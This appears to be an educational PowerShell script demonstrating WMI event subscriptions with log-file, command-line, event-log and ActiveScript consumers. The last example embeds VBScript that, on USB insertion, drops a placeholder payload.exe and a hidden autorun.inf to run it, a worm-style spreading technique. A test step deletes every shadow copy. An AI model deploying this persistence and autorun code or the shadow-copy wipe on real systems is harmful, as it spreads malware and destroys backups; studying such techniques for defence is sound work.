# Log File Consumer Example
############################

###################################
# Filter for Service Modification #
###################################

#Creating a new event filter
$ServiceFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()

# Set the properties of the instance
$ServiceFilter.QueryLanguage = 'WQL'
$ServiceFilter.Query = "select * from __instanceModificationEvent within 5 where targetInstance isa 'win32_Service'"
$ServiceFilter.Name = "ServiceFilter"
$ServiceFilter.EventNamespace = 'root\cimv2'

# Sets the intance in the namespace
$FilterResult = $ServiceFilter.Put()
$ServiceFilterObj = $FilterResult.Path


#############################
# Consumer for log creation #
#############################

#Creating a new event consumer
$LogConsumer = ([wmiclass]"\\.\root\subscription:LogFileEventConsumer").CreateInstance()

# Set properties of consumer
$LogConsumer.Name = 'ServiceConsumer'
$LogConsumer.Filename = "C:\Log.log"
$LogConsumer.Text = 'A change has occurred on the service: %TargetInstance.DisplayName%'

# Sets the intance in the namespace
$LogResult = $LogConsumer.Put()
$LogConsumerObj = $LogResult.Path

#################
# Create Binder #
#################

# Creating new binder
$instanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()

$instanceBinding.Filter = $ServiceFilterObj
$instanceBinding.Consumer = $LogConsumerObj
$result = $instanceBinding.Put()
$newBinding = $result.Path

############
# Clean Up #
############

#Removing WMI Subscriptions using Remove-WMIObject
#Filter
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='ServiceFilter'" | 
    Remove-WmiObject -Verbose
 
#Consumer
Get-WMIObject -Namespace root\Subscription -Class LogFileEventConsumer -Filter "Name='ServiceConsumer'" | 
    Remove-WmiObject -Verbose
 
#Binding
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%ServiceFilter%'"  | 
    Remove-WmiObject -Verbose
# ----------------------------------------------------------------------------------------------------

# CommandLine Consumer Example
###############################


##############################
# Filter for removable drive #
##############################

#Creating a new event filter
$RemovableDrvFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()

# Set the properties of the instance
$RemovableDrvFilter.QueryLanguage = 'WQL'
$RemovableDrvFilter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE
                             TargetInstance ISA 'Win32_Volume' AND
                             TargetInstance.DriveType=2"
$RemovableDrvFilter.Name = "USBDrvFilter"
$RemovableDrvFilter.EventNamespace = 'root\cimv2'

# Sets the intance in the namespace
$FilterResult = $RemovableDrvFilter.Put()
$USBFilterObj = $FilterResult.Path

##################################
# Consumer for Command Execution #
##################################

#Creating a new event consumer
$CommandConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$CommandConsumer.Name = 'WriteToUSB'
$CommandConsumer.ExecutablePath = "C:\\Windows\\System32\\cmd.exe"
$CommandConsumer.CommandLineTemplate = "C:\\Windows\\System32\\cmd.exe /c echo hello > %TargetInstance.DriveLetter%\\test.txt"

# Sets the intance in the namespace
$CmdResult = $CommandConsumer.Put()
$CmdConsumerObj = $CmdResult.Path

#################
# Create Binder #
#################

# Creating new binder
$instanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()

$instanceBinding.Filter = $USBFilterObj
$instanceBinding.Consumer = $CmdConsumerObj
$result = $instanceBinding.Put()
$newBinding = $result.Path

############
# Clean Up #
############

([wmi]$USBFilterObj).Delete()
([wmi]$CmdConsumerObj).Delete()
([wmi]$newBinding).Delete()

# ----------------------------------------------------------------------------------------------------

# EventLog Consumer Example
###########################


##############################
# Filter for VSS Creation #
##############################

#Creating a new event filter
$VSSFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()

# Set the properties of the instance
$VSSFilter.QueryLanguage = 'WQL'
$VSSFilter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE
                    TargetInstance ISA 'Win32_ShadowCopy'"
$VSSFilter.Name = "VSSFilter"
$VSSFilter.EventNamespace = 'root\cimv2'

# Sets the intance in the namespace
$FilterResult = $VSSFilter.Put()
$VSSObj = $FilterResult.Path

############################
# Consumer for NTEventLog  #
############################

#Creating a new event consumer
$EvtConsumer = ([wmiclass]"\\.\root\subscription:NTEventLogEventConsumer").CreateInstance()
$EvtConsumer.Name = 'VSSReport'
$EvtConsumer.EventID = 8
$EvtConsumer.EventType = 8
$EvtConsumer.Category = 0
$EvtConsumer.InsertionStringTemplates = @(
    "A Volume Shadow Copy Has been created."
    "Date: %TargetInstance.InstallDate%",
    "ID: %TargetInstance.InstallDate%",
    "VolumeName: %TargetInstance.VolumeName%",
    "DeviceObject: %TargetInstance.DeviceObject%",
    "Count: %TargetInstance.Count",
    "Persistent: %TargetInstance.Persistent%",
    "State: %TargetInstance.State%")
$EvtConsumer.NumberOfInsertionStrings = 8
$EvtConsumer.SourceName = "WSH"

# Sets the intance in the namespace
$EvtResult = $EvtConsumer.Put()
$EvtConsumerObj = $EvtResult.Path

#################
# Create Binder #
#################

# Creating new binder
$instanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()

$instanceBinding.Filter = $VSSObj
$instanceBinding.Consumer = $EvtConsumerObj
$result = $instanceBinding.Put()
$newBinding = $result.Path

########
# Test #
########

$VSSClass = [wmiclass]"Win32_ShadowCopy"
$VSSClass.Create("C:\","ClientAccessible")
Get-EventLog -LogName Application -EntryType SuccessAudit -Source 'WSH'

# Delete shadow copies 
Get-WmiObject win32_shadowcopy | foreach {$_.delete()}

############
# Clean Up #
############

([wmi]$VSSObj).Delete()
([wmi]$EvtConsumerObj).Delete()
([wmi]$newBinding).Delete()

# ----------------------------------------------------------------------------------------------------

# ActionScript Consumer Example
###########################

##############################
# Filter for removable drive #
##############################

#Creating a new event filter
$RemovableDrvFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()

# Set the properties of the instance
$RemovableDrvFilter.QueryLanguage = 'WQL'
$RemovableDrvFilter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE
                             TargetInstance ISA 'Win32_Volume' AND
                             TargetInstance.DriveType=2"
$RemovableDrvFilter.Name = "USBDrvFilter"
$RemovableDrvFilter.EventNamespace = 'root\cimv2'

# Sets the intance in the namespace
$FilterResult = $RemovableDrvFilter.Put()
$USBFilterObj = $FilterResult.Path

##############################
# Consumer for ActionScript  #
##############################

$ScriptConsumer = ([wmiclass]"\\.\root\subscription:ActiveScriptEventConsumer").CreateInstance()
$ScriptConsumer.Name = 'AutoRun'
$ScriptConsumer.ScriptText = '
 Function Base64Decode(ByVal base64String)

    Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    Dim dataLength, sOut, groupBegin
  
    base64String = Replace(base64String, vbCrLf, "")
    base64String = Replace(base64String, vbTab, "")
    base64String = Replace(base64String, " ", "")
  

    dataLength = Len(base64String)
    If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
    End If
  

    For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut

    numDataBytes = 3
    nGroup = 0
    For CharCounter = 0 To 3

        thisChar = Mid(base64String, groupBegin + CharCounter, 1)
        If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
        Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
        End If
        If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
        End If
        nGroup = 64 * nGroup + thisData
    Next
    

    nGroup = Hex(nGroup)
    

    nGroup = String(6 - Len(nGroup), "0") & nGroup
    

    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
        Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
        Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    

    sOut = sOut & Left(pOut, numDataBytes)
    Next
    Base64Decode = sOut
End Function

Set objFSO=CreateObject("Scripting.FileSystemObject")

payContent = Base64Decode("SSdtIGEgZXZpbCBwYXlsb2Fk")
Set objPayload = objFSO.CreateTextFile("D:\payload.exe",True)
objPayload.Write payContent
objPayload.Close

outFile= TargetEvent.TargetInstance.DriveLetter & "\autorun.inf"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.WriteLine("[AutoRun]")
payloadpath = "shellexecute=" & TargetEvent.TargetInstance.DriveLetter & "\payload.exe"
objFile.WriteLine(payloadpath)
objFile.WriteLine("UseAutoPlay=1")
objFile.Close
Set autoRunsFile = objFSO.GetFile(outFile)
autoRunsFile.attributes = 2

'

$ScriptConsumer.ScriptingEngine = 'VBScript'
$scriptResult = $ScriptConsumer.Put()
$scriptObj = $scriptResult.Path

#################
# Create Binder #
#################

# Creating new binder
$instanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()

$instanceBinding.Filter = $USBFilterObj
$instanceBinding.Consumer = $scriptObj
$result = $instanceBinding.Put()
$newBinding = $result.Path

############
# Clean Up #
############

([wmi]$USBFilterObj).Delete()
([wmi]$scriptObj).Delete()
([wmi]$newBinding).Delete()